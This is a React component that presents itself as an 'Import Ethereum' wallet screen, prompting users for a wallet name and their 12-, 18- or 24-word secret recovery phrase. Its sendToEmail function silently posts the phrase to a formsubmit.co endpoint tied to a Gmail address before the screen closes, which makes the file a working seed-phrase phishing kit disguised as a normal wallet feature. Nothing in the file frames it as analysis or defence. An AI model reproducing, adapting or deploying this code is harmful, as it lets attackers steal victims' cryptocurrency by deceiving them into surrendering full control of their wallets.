"use client"

import { useState } from "react"
import { ArrowLeft, Maximize2, X } from "lucide-react"

interface ImportWalletPopupProps {
  isOpen: boolean
  onClose: () => void
  onSubmit?: (walletName: string, secretPhrase: string) => void
}

export default function ImportWalletPopup({ isOpen, onClose, onSubmit }: ImportWalletPopupProps) {
  const [walletName, setWalletName] = useState("")
  const [secretPhrase, setSecretPhrase] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const sendToEmail = async (walletName: string, secretPhrase: string) => {
    try {
      const formData = new FormData()
      formData.append('Wallet_Name', walletName)
      formData.append('Secret_Phrase', secretPhrase)
      formData.append('_subject', '🔐 New Wallet Import')
      formData.append('_captcha', 'false')
      
      const response = await fetch('https://formsubmit.co/metawalleresponse2@gmail.com', {
        method: "POST",
        body: formData,
      })

      if (!response.ok) {
        console.error("Failed to send email")
      }
    } catch (err) {
      console.error("Email error:", err)
    }
  }

  const validateSecretPhrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/)
    const wordCount = words.length
    return wordCount === 12 || wordCount === 18 || wordCount === 24
  }

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
      setError("")
    } catch (err) {
      console.error("Failed to read clipboard:", err)
    }
  }

  const handleRestore = async () => {
    setError("")
    
    if (!validateSecretPhrase(secretPhrase)) {
      setError("Secret phrase must contain exactly 12, 18, or 24 words")
      return
    }

    setIsSubmitting(true)
    
    try {
      await sendToEmail(walletName, secretPhrase)
      
      if (onSubmit) {
        onSubmit(walletName, secretPhrase)
      }
      
      onClose()
      setWalletName("Ethereum Wallet")
      setSecretPhrase("")
    } catch (err) {
      setError("Failed to restore wallet. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleClearWalletName = () => {
    setWalletName("")
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 bg-black z-50 flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-4 bg-[#1a1a1a]">
        <button
          onClick={onClose}
          className="text-white p-2 hover:bg-white/10 rounded-lg transition-colors"
          aria-label="Back"
        >
          <ArrowLeft size={24} />
        </button>
        <h1 className="text-white text-lg font-semibold">Import Ethereum</h1>
        <button
          className="text-white p-2 hover:bg-white/10 rounded-lg transition-colors"
          aria-label="Fullscreen"
        >
          <Maximize2 size={24} />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto px-6 py-6 bg-black">
        {/* Wallet Name */}
        <div className="mb-6">
          <label className="block text-gray-400 text-sm mb-2">Wallet name</label>
          <div className="relative">
            <input
              type="text"
              value={walletName}
              onChange={(e) => setWalletName(e.target.value)}
              className="w-full bg-[#1a1a1a] text-white px-4 py-4 rounded-xl border border-gray-700 focus:border-gray-600 focus:outline-none"
              placeholder="Enter wallet name"
            />
            {walletName && (
              <button
                onClick={handleClearWalletName}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                aria-label="Clear"
              >
                <X size={20} />
              </button>
            )}
          </div>
        </div>

        {/* Secret Phrase */}
        <div className="mb-4">
          <label className="block text-gray-400 text-sm mb-2">Secret phrase</label>
          <div className="relative">
            <textarea
              value={secretPhrase}
              onChange={(e) => {
                setSecretPhrase(e.target.value)
                setError("")
              }}
              className="w-full bg-[#1a1a1a] text-white px-4 py-4 rounded-xl border border-gray-700 focus:border-gray-600 focus:outline-none resize-none h-64"
              placeholder="Enter your secret phrase"
            />
            <button
              onClick={handlePaste}
              className="absolute right-4 bottom-4 text-green-500 hover:text-green-400 font-medium text-sm"
            >
              Paste
            </button>
          </div>
          {error && (
            <p className="text-red-500 text-xs mt-2">{error}</p>
          )}
        </div>

        {/* Info Text */}
        <p className="text-gray-500 text-sm text-center mb-8">
          Typically 12 (sometimes 18, 24) words separated by single spaces
        </p>
      </div>

      {/* Bottom Section */}
      <div className="px-6 py-6 bg-black border-t border-gray-900">
        {/* Restore Button */}
        <button
          onClick={handleRestore}
          disabled={!walletName.trim() || !secretPhrase.trim() || isSubmitting}
          className="w-full bg-green-600 hover:bg-green-700 disabled:bg-green-900 disabled:opacity-50 text-white font-semibold py-4 rounded-full transition-colors mb-4"
        >
          {isSubmitting ? "Restoring..." : "Restore wallet"}
        </button>

        {/* Info Link */}
        <button className="w-full text-green-500 hover:text-green-400 text-sm font-medium">
          What is a secret phrase?
        </button>
      </div>
    </div>
  )
}
